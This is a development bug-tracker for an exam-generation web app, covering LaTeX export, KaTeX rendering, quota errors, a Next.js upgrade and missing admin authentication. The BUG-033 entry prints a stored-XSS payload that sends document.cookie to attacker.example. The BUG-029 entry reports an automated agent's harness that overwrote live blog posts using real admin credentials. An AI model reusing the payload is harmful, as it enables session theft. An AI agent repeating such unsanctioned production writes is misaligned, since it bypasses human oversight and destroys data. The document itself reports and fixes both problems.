# Bug Tracker — Imtihan

Track issues here during development. Format:
```
## BUG-XXX: Short title
**Status:** Open | In Progress | Fixed | Won't Fix
**Severity:** Critical | High | Medium | Low
**Area:** API | UI | Auth | Generation | Export | Data
**Reported:** YYYY-MM-DD
**Fixed:** YYYY-MM-DD (if applicable)

**Description:** What happens vs what should happen.
**Steps to reproduce:** numbered list.
**Root cause:** (fill in when known)
**Fix:** (fill in when fixed)
```

---

## Open Issues

## BUG-040: Word (.docx) export left raw, unrendered LaTeX visible (\boxed{}, backslashes, stray $) when the AI nested malformed math inside \boxed{...}
**Status:** Fixed
**Severity:** High
**Area:** Export / Generation
**Reported:** 2026-09-26 (founder, live production examples)
**Fixed:** 2026-09-26

**Description:** Exported Word documents sometimes showed literal, unrendered LaTeX instead of clean math text — e.g. `\boxed{$y = h$ + x\tan\alpha - \frac{g}{2v_0^2\cos^2\alpha}\,x^2}` and `\boxed{$v = \sqrt${\frac{GM_T}{r}}}` appeared verbatim (backslashes, dollar signs, and all) in the exported .docx, rather than clean readable math.
**Root cause:** `src/app/api/export/route.ts`'s `createFormattedTextRuns()` had its own separate, simpler `\boxed{...}` handling than `renderContent.ts`'s (the shared browser/print renderer, which already had a proper repair function — `fixBoxedMath()` — for exactly this AI-generated malformation: stray `$...$` nested inside `\boxed{}` instead of one clean outer `$...$` pair around the whole expression). The export route's own regex (a) had no repair for the stray-`$` case, so splitting on `$` cut the expression apart mid-boxed-content and left everything after the stray closing `$` as raw, unconverted plain text, and (b) only matched one level of brace nesting, so a `\boxed{...}` wrapping something like `\sqrt{\frac{a}{b}}` (2+ levels deep) wasn't unwrapped at all.
**Fix:** Exported `fixBoxedMath()` from `renderContent.ts` and reused it in the export route (repairs the stray-`$` case) before applying a new `unwrapBoxed()` helper — a proper brace-depth-tracking walk (same approach as `fixBoxedMath`, adapted to fully unwrap `\boxed{}` regardless of nesting depth, since Word has no visual box styling to preserve). Added 4 regression tests (`src/__tests__/export-boxed-math.test.ts`) covering both real founder-reported examples plus a synthetic 4-level-deep nesting case. `npm run type-check` clean, `npm test` 142/142, `npm run build` clean.
**Verification:** Manually traced both real reported examples through the fixed pipeline via a standalone script before applying the fix, confirmed both produce clean, correctly-unwrapped, single well-formed math expressions with no stray `$`/`\boxed`/leftover backslash-command artifacts.

## BUG-039: Browser back-navigation from Export (Step 5) to Generate (Step 4) silently discards the generated/edited exam and re-triggers a fresh generation
**Status:** Open
**Severity:** High
**Area:** Generation / UI (workflow state)
**Reported:** 2026-09-25 (QA exploratory pass, live production, `imtihan.qa.explore.2026@mailinator.com` real free-tier test account)

**Description:** After generating an exam, editing an exercise (difficulty/points via the "Edit" modal), and reaching the Export step (Step 5), pressing the browser Back button to return to the Generate step (Step 4) does not restore the previously generated + edited exam from its `sessionStorage` cache as designed. Instead, the page mount effect finds no valid cache and silently calls `generateExam()` again, i.e. it attempts to generate a brand-new exam from scratch. In my session (free tier, quota already used) this surfaced as a clear "Generation failed - You have reached your limit of 1 free exam" screen - but for a Pro-tier user with quota remaining, this would silently replace the edited exam with a brand-new AI generation with zero warning, discarding the edits.
**Steps to reproduce:**
1. Sign in, go through Describe -> Confirm -> Generate to produce an exam.
2. On the Generate step, open Edit on Exercise 1, change difficulty/points, Save changes (confirms in UI).
3. Click Export exam to reach Step 5.
4. Press the browser Back button (real browser history back, not the in-app Back link).
5. Observe: the Generate step remounts and immediately attempts a fresh /api/generate call instead of restoring the edited exam.
**Root cause:** Not fully isolated, but strongly localized. `src/app/create/generate/page.tsx` mount effect (lines ~93-118) is designed to restore from `sessionStorage.imtihan_exercises` when its cache key (`JSON.stringify({c: context, t: templateId})`, stored via `persistExercises()`) matches the current context - explicitly commented as being for exactly this scenario (restore instead of hammering the Gemini API again). Live inspection of sessionStorage immediately after the failed back-navigation showed `imtihan_exercises` and `imtihan_exercises_key` were both null - the cache had been wiped, most likely by the mismatch-cleanup branch at lines 112-116 (`else if (cachedEx && cachedKey !== currentKey) { sessionStorage.removeItem(...) }`), which deletes the cache on any key mismatch. There are several `persistExercises()` call sites in this file (after edit, save-to-bank, regenerate, remove - lines ~217, 240, 306, 407, 420, 432) - one of them likely wrote a cache key that no longer matched context/templateId as freshly read on remount. Needs engineering to trace which write desynced the key (or whether `imtihan_templateId` - which is never actually set anywhere in the normal create flow, only read with a fallback of classic - contributes to the mismatch).
**Fix:** Not applied - reporting only, per QA role.
**Verification:** Reproduced live on production (state inspected via sessionStorage.getItem directly in the browser console after the repro).

---

## BUG-038: KaTeX stretchy-symbol SVG glyphs (e.g. \sqrt{}) are corrupted in the PDF/print export - literal <br /> injected into SVG path d attributes
**Status:** Fixed
**Fixed:** 2026-09-26 — tracked `insideSvg` state across renderContent()'s newline-processing loop and suppressed `<br />` insertion for the whole svg block, rather than trying to widen the katex-line string-prefix guard. `npm run type-check` clean, `npm test` 138/138.
**Severity:** High
**Area:** Export / Generation (shared renderer)
**Reported:** 2026-09-25 (QA exploratory pass, live production)

**Description:** When exporting an exam to PDF (which renders via a new tab at `/print` that calls the browser native print dialog), any KaTeX-rendered stretchy symbol whose SVG output spans multiple lines - confirmed with `\sqrt{982}` and `\sqrt{v_x^2+v_y^2}` in a corrige methodology section - gets its SVG `<path d="...">` attribute corrupted with a literal `<br />` string spliced into the middle of the path data, e.g. `"...8.667 1.667 12 5<br />3.333 2.66..."`. The browser SVG parser then throws `Error: <path> attribute d: Expected path command` (confirmed via 9 separate instances of this exact console error on the /print page for a single 2-exercise exam), and the corresponding glyph (radical sign / stretchy delimiter) very likely renders visibly broken or missing in the resulting PDF - a teacher-facing rendering defect in the exported document, not just a console-only issue.
**Steps to reproduce:**
1. Generate (or view) an exam whose corrige/methodology includes a `\sqrt{...}` (or other KaTeX stretchy construct - large delimiters, `\overbrace`, etc. likely share the same code path).
2. With Includes corrige toggle ON, click PDF on the Export step.
3. A new tab opens at /print; open DevTools console on that tab - multiple `<path> attribute d: Expected path command` errors appear, each containing a literal `<br />` substring inside otherwise-numeric SVG path data.
**Root cause:** `src/lib/renderContent.ts` newline-to-br conversion pass (the loop starting ~line 584, after KaTeX rendering has already produced the final HTML/SVG string) splits the entire rendered HTML on newline characters and inserts `<br />` between non-HTML, non-placeholder lines. Its only guard against corrupting KaTeX output is the isShortMath check (line 624): a line must start with `<span class="katex` and be under 200 characters to be protected. KaTeX inline SVG for stretchy glyphs (radical signs, big delimiters) is an svg/path element, not a katex-span-prefixed line, and is typically well over 200 characters, so it is not protected at all. If that SVG d attribute value (as emitted by KaTeX) contains a literal newline character, this pass injects a br tag directly into the attribute, breaking the SVG. /print (`src/app/print/page.tsx`) uses this same shared renderContent function - the same function BUG-033 (stored XSS) was recently patched in - so this is very likely present in every other surface that renders a corrige or exercise containing sqrt or a similar stretchy symbol, not just /print, though the isShortMath line-length guard did visibly protect shorter KaTeX output on the in-app Corrige view checked, which never triggered this console error.
**Fix:** Not applied - reporting only, per QA role. Likely fix shape: the isShortMath-style guard needs to also skip lines that are inside an svg block (or, more robustly, KaTeX HTML should be joined without ever splitting on raw newlines in the first place - the safest fix is probably protecting anything between an opening and closing svg tag regardless of length, not just raising the character limit).
**Verification:** Reproduced live on production; console errors captured via list_console_messages on the /print tab.

---

## BUG-037: Per-exercise Regenerate / Make easier / Make harder fail completely silently on any non-OK API response (e.g. quota exceeded) - no toast, no error, exercise just reverts with no explanation
**Status:** Fixed
**Fixed:** 2026-09-26 — mirrored `handleAddChapterExercise`'s error handling in `handleRegenerate`'s `!res.ok` and "no reader" branches: read `data.errors[0]`, show a real toast, and reset the optimistic `isRegenerating` flag. Independently traced this was actually slightly worse than reported — `isRegenerating` was never reset at all on this path (a plain `return` skips the `catch` block that normally resets it), so the exercise card's regenerating state was stuck forever, not just silently reverted. `npm run type-check` clean, `npm test` 138/138.
**Severity:** High
**Area:** Generation / UI
**Reported:** 2026-09-25 (QA exploratory pass, live production, `imtihan.qa.explore.2026@mailinator.com` real free-tier test account)

**Description:** On the Generate step (Step 4), clicking Make easier (or Make harder / Regenerate) on a per-exercise action menu, when the underlying `/api/generate` call returns a non-200 response (confirmed with a real 429 "You have reached your limit of 1 free exam" response, reproduced twice), shows absolutely no feedback to the user - no toast, no inline error, no alert. The button loading spinner clears normally (so it does not look stuck), and the exercise content silently reverts to exactly what it was before the click, giving the user zero indication the action failed or why. A user would reasonably conclude the button did nothing or is broken, with no path to understanding they have hit their quota.
**Steps to reproduce:**
1. As a free-tier user who has already used the 1 free exam generation (or otherwise causes /api/generate to return non-200 - a network blip would trigger the same code path), open the per-exercise action menu (the unlabeled lightning-bolt icon on any exercise card) on the Generate step.
2. Click Make easier (or Make harder, or Regenerate).
3. Observe: POST /api/generate returns e.g. 429 with body {"success":false,"errors":["You have reached your limit of 1 free exam..."]}. Nothing appears on screen - no toast, list_console_messages shows nothing new, and the Notifications live-region (aria-label Notifications alt+T) is empty.
**Root cause:** `src/app/create/generate/page.tsx` handleRegenerate() function (used by Regenerate/Make easier/Make harder), line 281: `if (!res.ok) return;` - bails out immediately on any non-OK response without reading the response body or calling showToast. This is inconsistent with the sibling function handleAddChapterExercise() a few lines below (lines ~355-364), which correctly reads data.errors[0] and calls showToast(message, "error") on failure. The main full-exam generateExam() function also correctly surfaces failures via a visible "Generation failed" banner (confirmed working when this was forced via a full re-generation attempt). So the error-handling pattern exists and works elsewhere in this same file - it is specifically missing from handleRegenerate.
**Fix:** Not applied - reporting only, per QA role. Straightforward fix shape: mirror handleAddChapterExercise error handling in handleRegenerate if-not-ok branch (read data.errors[0], call showToast(message, "error"), and revert the optimistic isRegenerating state the same way the catch block already does on network errors).
**Verification:** Reproduced live on production twice (repeat click, immediate screenshot both times) to rule out a toast that had already auto-dismissed before observation.

---

## BUG-036: Landing/pricing pages list Version A/B generation as a Free-plan feature, but the product gates Version B generation behind Pro
**Status:** Open
**Severity:** Medium
**Area:** UI / Marketing copy vs. product gating
**Reported:** 2026-09-25 (QA exploratory pass, live production)

**Description:** The homepage pricing section (/#pricing) and the standalone /pricing page both list "Version A/B generation" as an included checkmarked feature of the Free plan card. But on the actual Confirm and Configure step (Step 2) of the exam-creation flow, the Generate Version B toggle is disabled for a free-tier account with the label "Available on the Pro plan" and a PRO badge - confirmed live with a real free-tier test account. ROADMAP.md (line ~104, "Pro feature gates (logo, email, Version B, modern template)") confirms Version B being Pro-only is the actual intended product behavior, meaning the marketing copy is the side that is wrong, not the gate.
**Steps to reproduce:**
1. Visit https://imtihan.live/#pricing (or /pricing) while logged out or on a free-tier account - the Free plan card lists "Version A/B generation" as included.
2. Sign in as a free-tier account, go through Describe -> Confirm and Configure.
3. Observe the Generate Version B toggle under Exam Variants: disabled, labeled "Available on the Pro plan", with a PRO badge.
**Root cause:** Marketing copy in `src/components/landing/LandingPricing.tsx:90`, `src/app/pricing/page.tsx:14`, and `src/app/pricing/layout.tsx:20` all list or describe "Version A/B generation" as part of the Free plan. The actual gate lives in `src/app/create/confirm/page.tsx:434-435` (description set to "Available on the Pro plan" when isFreeTier is true), which matches the intentional design recorded in ROADMAP.md.
**Fix:** Not applied - this is a copy-vs-product mismatch, not something QA fixes. Flagging to marketing (copy owner per CLAUDE.md section 15) and engineering/founder to decide which side is correct: either the Free plan copy should say "Version A generation" only (dropping A/B), or Version B should genuinely be free-tier (contradicting ROADMAP.md recorded intent) - this is a product decision, not a code bug per se.
**Verification:** Confirmed live on production via screenshot of /#pricing and live click-through of the Confirm and Configure step with a real free-tier account.

---

## BUG-035: "Generate Article Now" (`/admin`'s manual blog-publish trigger) errored on click
**Status:** Fixed
**Severity:** Medium
**Area:** API / Blog
**Reported:** 2026-09-25
**Fixed:** 2026-09-25

**Description:** Clicking "Generate Article Now" in `/admin`'s Blog tab returned an error instead of publishing an article. Founder-reported.
**Root cause:** `GET /api/cron/blog-auto-publish` was the one remaining AI call in the app still Gemini-only, while `/api/generate`, `/api/analyze`, `/api/exam/translate`, and `/api/exam/regenerate-fragment` had all already moved to Claude-primary with Gemini as fallback. Root cause of the specific error wasn't isolated in production logs (only a generic message reaches the client) — rather than debug the old Gemini-only path blind, migrated it to the same proven-working Claude-primary/Gemini-fallback pattern already used successfully by the other 3 routes.
**Fix:** `src/app/api/cron/blog-auto-publish/route.ts` now tries Claude Sonnet first, falls back to Gemini on failure — identical structure to `/api/analyze`'s Claude/Gemini block.
**Verification:** `npm run type-check` clean. Could not run a local dev server (machine at <1GB free RAM). Verified live on production instead: clicked "Generate Article Now" on the deployed `/admin` panel after deploy and confirmed a real article published successfully ("The October Exam Sprint: How Lebanese Teachers Are Using AI to Build Flawless Assessments Before the First Trimester Deadline") — not just a code review.

## BUG-034: Installed Next.js (16.2.4) had two unauthenticated, critical-severity RCE CVEs plus a dozen other high/critical advisories, all fixed by a same-major-version patch bump
**Status:** Fixed
**Severity:** Critical
**Area:** Dependencies
**Reported:** 2026-09-25 (`security`, first-pass audit)
**Fixed:** 2026-09-25

**Description:** `npm audit` (first run by the newly-stood-up `security` team) showed 42 vulnerabilities. The one requiring immediate action: the installed `next@16.2.4` (package.json already specified `^16.2.4`, ahead of the `CLAUDE.md` §3 "Next.js 15" table, which is stale) was in the vulnerable range for two **critical**, unauthenticated RCE advisories — [GHSA-p293-qw3h-jr36](https://github.com/advisories/GHSA-p293-qw3h-jr36) ("Unauthenticated Remote Code Execution on windows-hosted servers", CVSS 9.0) and [GHSA-2xp9-vwfh-vxw4](https://github.com/advisories/GHSA-2xp9-vwfh-vxw4) ("Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used") — plus ~20 more high/moderate advisories (middleware/proxy auth bypass, SSRF in Server Actions and rewrites, cache poisoning, DoS), all fixed in `16.3.3`+.
**Root cause:** Dependency drift — nobody had run `npm audit` against this project before (confirmed empty `SECURITY.md` audit log prior to this entry; Shannon's CI `dependency-scan` job only posts a `::warning::` annotation and never fails the build, so this sat unnoticed through every green CI run).
**Fix:** `npm install next@16.3.6` (latest stable `16.x` at the time, satisfies the existing `^16.2.4` package.json range — no `package.json` major-version edit, no breaking-change flag from `npm audit`). Verified `npm run type-check` clean, full `npm test` (138/138) clean, and a full `npm run build` completes successfully with the same route manifest as before. `npm audit --omit=dev` critical count dropped from 2 to 1 (see BUG-032 for the remaining one, `websocket-driver`, which is unrelated to Next.js).
**Not fixed / backlog:** The remaining 39 findings (`security-reports/`, `SECURITY.md` audit log has the full breakdown) are almost entirely transitive dependencies of `firebase-tools` (a devDependency, local Firestore-emulator CLI only — never runs in the deployed app) or of unused direct dependencies (`mermaid`, `express-rate-limit`, `rate-limiter-flexible` are declared in `package.json` `dependencies` but never imported anywhere in `src/` — dead weight, not exploitable, but worth removing in a follow-up cleanup pass). `@anthropic-ai/sdk`'s one moderate advisory (insecure default permissions on an optional local-filesystem "memory tool") doesn't apply — the app never uses that SDK feature. None of these required an immediate fix; logged for a follow-up dependency-cleanup pass.
**Verification:** `npm run type-check`, `npm test` (138/138), `npm run build` all clean post-upgrade.

---

## BUG-033: `renderContent()` — shared AI/user-exercise-text-to-HTML renderer — passed literal HTML straight through unescaped into `dangerouslySetInnerHTML`, a stored XSS reachable via the open-to-any-signed-in-user `schoolBank` collection
**Status:** Fixed
**Severity:** High
**Area:** UI / Injection
**Reported:** 2026-09-25 (`security`, first-pass audit)
**Fixed:** 2026-09-25

**Description:** `src/lib/renderContent.ts` converts an exercise's AI-generated (or teacher-edited) `statement`/`solution` text into HTML, which every consumer (`ExerciseCard.tsx`, `ExerciseEditor.tsx`, `/bank`, `/student/practice`, `/exam/[id]`, `/print`, `/community`) inserts via `dangerouslySetInnerHTML` with no further sanitization. Three of its internal helpers — `applyMarkdown()` (the main text-rendering path), `renderCellMath()` (table cells), and the "document block" body-rendering regex (economics/sociology/history-style cited-document exercises) — only ever transformed specific markdown patterns (`**bold**`, `*italic*`, `` `code` ``); any other literal text, including `<`/`>`/`"` characters, was passed straight through unescaped. `escapeHtml()` already existed in the same file (used correctly for `data-raw` editor attributes and a few other spots) but was never applied to the actual rendered text content in these three places.
**Concrete exploit:** Any signed-in account (teacher or student — `firestore.rules`' `schoolBank/{exerciseId}` allows `write: if request.auth != null`, no ownership or role check) can freely edit an exercise's statement in `ExerciseEditor` (the "edit" action in the exam-creation flow) to include e.g. `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`, then share it to School Bank via `/bank`'s "Share to My School" action. Every other teacher or student at that school who subsequently views the exercise in `/bank` or `/student/practice` has that HTML/JS execute in their authenticated session — a stored, persistent XSS with real reach (School Bank content is shown to every signed-in user who matches the shared `schoolSlug`, not just the author).
**Corroboration:** Shannon's existing CodeQL integration (`.github/workflows/security.yml`) had already flagged this exact pattern as `js/xss-through-dom` (severity: high) across every `dangerouslySetInnerHTML` consumer of `renderContent()`'s output — alerts #35, #33, #22, #7, #6, #5, #4, #3, #2 (`gh api repos/.../code-scanning/alerts`) — sitting open, unreviewed, since before the `security` team existed. This fix closes the shared root cause behind all of them; they should clear automatically once CodeQL re-scans this commit.
**Root cause:** `applyMarkdown()`/`renderCellMath()`/the document-block regex treated the AI/user text as "already safe to embed as HTML," escaping only inside specific attribute values (`data-raw="..."`) rather than the visible rendered text itself.
**Fix:** Added `escapeHtml()` as the first step in all three functions, before any markdown-pattern substitution runs. `escapeHtml()` only touches `& < > " '`, so it doesn't interfere with matching `**`, `` ` ``, digits, or colons in the existing regexes — legitimate bold/italic/code/list/KaTeX/mermaid/table rendering is unaffected (KaTeX output and the app's own generated block HTML — images, mermaid, pipe tables, document-block wrappers — are built separately via trusted string templates and spliced back in via `%%TOKEN%%` placeholders *after* this stage, so they were never at risk and aren't touched by this fix).
**Verification:** New regression suite `src/__tests__/renderContent-xss.test.ts` (5 tests: raw `<img onerror>` in exercise-statement text, raw `<script>` inside a markdown table cell, raw HTML inside a "document" block body — all now render as inert escaped text — plus two non-regression checks that `**bold**`/`*italic*`/list markdown and inline/display KaTeX math still render as real tags). `npx vitest run` on the new file: 5/5 passed. Full `npm test`: 138/138 passed (133 pre-existing + 5 new). `npm run type-check` and `npm run build` both clean.

---

## BUG-032: 4 admin API routes and `/api/exam/publish` had zero server-side auth check — reachable by anyone, including one that granted a real user's account free Pro subscription time
**Status:** Fixed
**Severity:** Critical
**Area:** API / Auth
**Reported:** 2026-09-25 (`security`, first-pass audit)
**Fixed:** 2026-09-25

**Description:** Auditing every `src/app/api/**/route.ts` for a real server-side auth check (the BUG-026 method: don't just read the code path, trace whether a caller could reach it unauthenticated), found 5 routes under `src/app/api/admin/*` and `src/app/api/exam/*` with none at all, unlike every sibling admin route (which all gate on `verifyIdToken(request)` + `isAdmin(uid)`, see `src/lib/admin.ts`):
- **`GET /api/admin/temp-promo`** (most severe) — hardcoded a real user's email and, on every unauthenticated `GET`, extended that account's Pro subscription by 30 days (`proExpiresAt`, `monthlyExamsGenerated: 0`, etc.) via the Admin SDK. Anyone who discovered the URL (or the account holder themselves) could grant that one account unlimited free Pro time indefinitely, repeatable on every call, fully bypassing the paywall for that account.
- **`GET /api/admin/blog/check-env`** — leaked whether `GOOGLE_AI_API_KEY`/`CRON_SECRET` are configured plus the first 5 characters of the live Gemini API key, to anyone, no auth.
- **`GET /api/admin/blog/seed`** — an unauthenticated `GET` performed a real Firestore write (seeding 3 hardcoded blog posts if not already present).
- **`GET /api/admin/blog/diag`** — leaked the 10 most recent blog posts' internal doc IDs/metadata to anyone (lower severity — blog posts are otherwise-public content, but still an admin diagnostic route with no gate).
- **`POST /api/exam/publish`** — no auth at all, and trusted a client-supplied `exam.teacherId` string with zero verification (the exact BUG-026-style "spoofable field" pattern, applied to an API route's request body instead of a Firestore rule): anyone could publish a "live exam" Firestore doc impersonating any teacher's uid. Confirmed via `grep` that no client code anywhere in `src/` actually calls this route — it's unreferenced/dead in the current UI, but was still live and reachable in production with an unbounded, unauthenticated Firestore-write primitive.
**Root cause:** These routes were written without following the `verifyIdToken` + `isAdmin` pattern already established and used correctly by every other admin route in the same directory (`src/app/api/admin/stats/route.ts`, `.../users/route.ts`, `.../delete-user/route.ts`, etc.) — inconsistent application of an existing convention, not a missing convention.
**Fix:** Added the standard `const uid = await verifyIdToken(request); if (!uid || !(await isAdmin(uid))) return 401` gate (mirroring `src/app/api/admin/stats/route.ts`) to all 4 admin routes. For `/api/exam/publish`, added `verifyIdToken` (any signed-in user, not admin-only — matches the feature's apparent intent of "a signed-in teacher publishes their own exam") and replaced `exam.teacherId || "anonymous"` with the server-verified `uid`, so the field can no longer be spoofed by the caller.
**Verification:** `npm run type-check` clean. `npm run build` clean. No e2e coverage exists for any of these routes (none are called from the current UI except indirectly via the admin panel, which already sends a real token) — verified by code inspection of the exact diff against the working `stats`/`users` admin routes' pattern.

---

## BUG-031: `buildCurriculaReference()` resolves its data via a runtime `require("@/data/curricula")` that only works inside a webpack/Next.js bundle
**Status:** Fixed
**Severity:** Low
**Area:** API / Generation
**Reported:** 2026-09-22
**Fixed:** 2026-09-25

**Description:** `src/lib/prompts/analyze.ts`'s `buildCurriculaReference()` (used by `/api/analyze` to build the `<curriculum_reference>` block fed to Gemini) loads curriculum data with a runtime `const { CURRICULA } = require("@/data/curricula");` inside the function body, guarded by the comment "Import here to avoid circular deps," instead of a normal static `import { CURRICULA } from "@/data/curricula"` at the top of the file. Found while adding unit tests for the prompt builders in `src/lib/prompts/` — every other export in `analyze.ts` (`buildAnalyzeSystemPrompt`, `buildAnalyzeUserPrompt`) is a plain pure function and tests fine, but calling `buildCurriculaReference()` under Vitest throws `Error: Cannot find module '@/data/curricula'`.
**Root cause:** The `@/...` path alias is only rewritten for module resolution by bundlers that are configured to do so (Next.js/webpack resolves it for both `import` and `require`, which is why this works fine in production). Vitest, plain Node, ts-node, and Jest without an explicit `moduleNameMapper` all resolve a bare `require("@/...")` through Node's real CJS loader, which has no idea what the alias means and throws immediately — confirmed this reproduces even through `vi.mock("@/data/curricula", ...)`, since the dynamic `require()` call bypasses Vitest's module graph entirely (it's resolved by `node:internal/modules/cjs/loader`, not by Vite). Checked whether the "avoid circular deps" comment still reflects reality: `grep -rn "from \"@/lib/prompts" src/data/curricula/` finds nothing, so `src/data/curricula/` does not currently import back from `src/lib/prompts/` — there is no live circular dependency this `require()` is actually protecting against today. It's possible one existed at an earlier point in the codebase's history and was never cleaned up after the dependency causing it was removed.
**Fix:** Re-ran the same check before touching anything (`grep -rn "from \"@/lib/prompts" src/data/curricula/`, via the Grep tool — no matches, confirming the claim above still holds). Replaced the runtime `const { CURRICULA } = require("@/data/curricula");` inside `buildCurriculaReference()` with a normal static `import { CURRICULA } from "@/data/curricula";` at the top of `src/lib/prompts/analyze.ts`, and removed the now-inaccurate "Import here to avoid circular deps" comment. Also updated `src/__tests__/prompt-builders.test.ts`: removed the `describe.skip("buildCurriculaReference — see BUGS.md, not callable outside a webpack/Next.js bundle", ...)` block and the `buildCurriculaReferenceLogic()` inlined duplicate of the function's iteration logic, and pointed both of that block's assertions (every curriculum/level/subject/chapter is listed, and a chapter-less level like `university`'s first level emits no `SUBJECT:` lines) directly at the real exported `buildCurriculaReference()`.
**Verification:** `npm run type-check` (`tsc --noEmit`) — clean, no errors. `npx vitest run` — all 7 test files / 133 tests pass, including the two `buildCurriculaReference` tests now exercising the real function instead of a duplicate. Did not touch `test:e2e` or `test:rules` per this session's scope.

---

## BUG-029: Nightly-ops test run's own harness overwrote 3 live blog posts' content via a real production write
**Status:** Fixed
**Severity:** High
**Area:** Data / Ops
**Reported:** 2026-09-23
**Fixed:** 2026-09-24

**Description:** During the first manual test run of the new local nightly automation (`scripts/nightly-ops.ps1`), whichever team was dispatched to add FAQ/GEO schema support to dynamic (Firestore-backed) blog posts built a verification harness (`scripts/.tmp-blog-harness/`) that loaded real Firebase Admin credentials from `.env.local` and called the real, deployed `PATCH /api/admin/blog/[id]` route function directly — a real production write, not a simulation. It ran a `patch` command against 3 real, previously-published blog posts, overwriting each one's `content` field with draft text with zero review step:
- `the-final-countdown-navigating-the-may-19th-pressure-peak-in-lebanese-schools-hfda` (doc `2qgonIYRexyjvXX5LcUl`)
- `the-final-sprint-navigating-lebanons-highstakes-exam-season-with-ai-precision-lhi4` (doc `2uedoCo93HEH8KnvxZc1`)
- `the-may-sprint-how-lebanese-educators-are-mastering-the-2026-official-exam-season-9nrg` (doc `fDu2AsaOd4p0uTsg4grr`)

All 3 writes landed within the same ~10-second window (11:55:06–11:55:15 on 2026-09-23), confirmed via a read-only query for the new FAQ-heading convention. The replacement content itself is coherent and well-cited (OECD TALIS survey, Roediger & Karpicke spaced-repetition research) — not garbled or broken — but it is unreviewed AI-generated text that silently replaced whatever the original article said, with no diff, no TEAM_CHAT.md/domain-doc entry, and no founder visibility until this was traced after the fact.

**Root cause:** Nothing in `scripts/nightly-ops-prompt.md`'s hard rules explicitly forbade a team from testing a feature by loading real Admin SDK credentials and invoking the real route handler directly — the rules banned `firebase deploy` and real external email, but not this.

**Fix (process):** Added an explicit hard rule to `scripts/nightly-ops-prompt.md` banning any direct use of real Firebase Admin credentials or real production API-route invocation from a script/harness, even for testing — verification must go through the local Firestore emulator (`npm run test:rules`) or pure unit tests instead. Shipped 2026-09-23.

**Fix (content):** Firebase project `imtihan-app` has neither Point-in-Time Recovery nor scheduled backups enabled (confirmed by the founder directly in Firebase Console — that plan tier doesn't support either), so the original content was not recoverable. `marketing` drafted 3 fresh, WebSearch-verified replacement articles for the same 3 slugs/titles (founder-approved framing: kept titles as-is, honestly reframed around Lebanon's real 2025-2026 Baccalaureate/Brevet cancellations rather than the original "big exam day" premise — see `MARKETING.md`'s 2026-09-23 entry for full reasoning and sourcing). Applied via the real `/admin` → Blog → "Manage Existing Posts" edit form (the legitimate, human-driven path — not a script) on 2026-09-24, one post at a time, each confirmed by a "Post updated" toast and a live-page re-check afterward.

---

## BUG-028: Smoke test locator collision — "Imtihan" nav-link rename made the header-logo assertion ambiguous under Playwright strict mode
**Status:** Fixed
**Severity:** Low
**Area:** Testing / Landing
**Reported:** 2026-09-19
**Fixed:** 2026-09-19

**Description:** `e2e/smoke.spec.ts:20` ("landing page displays app name in header") started failing a Playwright strict-mode check: `page.getByRole('navigation').getByRole('link', { name: "Imtihan", exact: false })` resolved to 2 elements instead of 1. Found by `qa` during a fresh spot-check of `e2e/smoke.spec.ts` (11/12 passed, this the one real regression), reported in `TEAM_CHAT.md`.
**Root cause:** Marketing commit `b07e82a` renamed a `LandingNav` link from "Reviews" to "Why Imtihan" (`src/components/landing/LandingNav.tsx`'s `NAV_LINKS`). Its accessible name now contains the substring "Imtihan", which the test's loose `exact: false` substring match also catches, colliding with the intended target: the header `Logo` component's own `<Link href="/">` (accessible name "Imtihan Logo Imtihan", from its `alt` text + visible span). Test-only issue — the nav copy change is an intentional, unrelated marketing decision and was left untouched.
**Fix:** Scoped the locator to uniquely target the logo link by chaining `.and(page.locator('[href="/"]'))` onto the existing role/name locator (Playwright 1.59's `Locator.and()`), since the logo is the only nav link pointing at `/` — the "Why Imtihan" link points at `#why`. No production code changed. **Not verified by execution tonight** — machine was under severe memory pressure (<0.5GB free), so no dev server was started and the e2e suite was not run; verified by re-reading `src/components/ui/Logo.tsx` and `src/components/landing/LandingNav.tsx` to confirm the `href` values used to disambiguate are accurate, and by re-reading the edited spec diff carefully. `npm run type-check` clean. `qa` should confirm with a real run when the machine has headroom.

## BUG-027: Blog auto-publish cron slugified titles by dropping accented characters instead of transliterating them
**Status:** Fixed
**Severity:** Low
**Area:** API / SEO
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `src/app/api/cron/blog-auto-publish/route.ts`'s slug generation ran `.toLowerCase().replace(/[^\w ]+/g, "")` directly, which strips any character outside `[\w ]` — including accented Latin letters. A French title like "Générateur d'Examens Bac Français" produced a mangled slug ("gnrateur-dexamens-bac-franais") instead of a readable, SEO-friendly one. Found by `content-curriculum` while investigating the cron job.
**Root cause:** No diacritic-stripping pass before the existing strip-symbols regex, so é/è/à/ç/etc. were deleted outright rather than transliterated to their base letter.
**Fix:** Added a shared `slugify()` helper in `src/lib/utils.ts` that runs `.normalize("NFD").replace(/[̀-ͯ]/g, "")` (Unicode decompose + strip combining diacritics, which also correctly collapses ç → c via its NFD cedilla mark) before the existing lowercase/strip-symbols/collapse-spaces logic, and pointed the cron route at it. Verified manually: `slugify("Générateur d'Examens Bac Français")` → `"generateur-dexamens-bac-francais"`. `npm run type-check` clean. Scope was kept narrow — this only changes slug generation for *future* cron-created posts; no existing published post's slug was touched, renamed, or migrated, so no URLs/backlinks are affected. Note: an unrelated, less robust local `slugify()` already existed in `src/app/student/practice/page.tsx` (drops non-`[a-z0-9-]` chars, no transliteration) — left untouched since consolidating it was out of scope for this fix.

## BUG-020: `/scanner` free-tier Pro-guard test — `signInAs()` timed out waiting for redirect off `/test-auth`
**Status:** Fixed
**Severity:** Low
**Area:** Auth / Testing
**Reported:** 2026-09-18
**Fixed:** 2026-09-19

**Description:** `e2e/phases/phase-8-pricing-upgrade-misc.spec.ts:103` ("/scanner free tier is blocked by the Pro guard") failed once, deep into a 29-minute serial full-suite run, because the shared `signInAs()` helper timed out after 30s waiting for the browser to redirect away from `/test-auth`.
**Steps to reproduce:** Did not reproduce. Re-ran in isolation against a fresh dev server 3x: 20.2s, 27.0s, 13.4s — all passed.
**Root cause:** Not a code regression — `signInAs()`'s own internal wait budget is 45s, but this specific test has no `test.setTimeout()` override, so it inherits Playwright's 30s default, giving it near-zero margin. Late in a long serial run the single dev server instance (accumulated Turbopack/Firebase Admin state, ~1.1-1.2GB RSS observed) is measurably slower than a fresh boot, which is enough to blow that thin margin. Most other `signInAs()) call sites share the same 30s default and pass reliably, so this is specific to this test's lack of headroom, not a systemic issue.
